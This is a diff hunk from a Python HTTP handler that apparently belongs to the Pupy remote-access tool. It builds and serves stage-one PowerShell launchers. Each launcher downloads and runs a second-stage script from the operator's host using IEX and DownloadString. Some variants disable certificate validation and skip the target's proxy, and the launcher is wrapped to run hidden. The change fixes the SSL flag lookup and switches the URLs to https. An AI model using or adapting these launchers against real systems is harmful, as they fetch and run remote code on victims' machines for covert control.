@@ -92,16 +92,16 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
             if self.server.useTargetProxy == True:
                 print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
-                if not self.ssl:
+                if not self.server.ssl:
                     launcher = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                 else:
-                    launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                    launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
             else:
                 print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
-                if not self.ssl:
+                if not self.server.ssl:
                     launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                 else:
-                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
             launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
             self.wfile.write(launcher)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
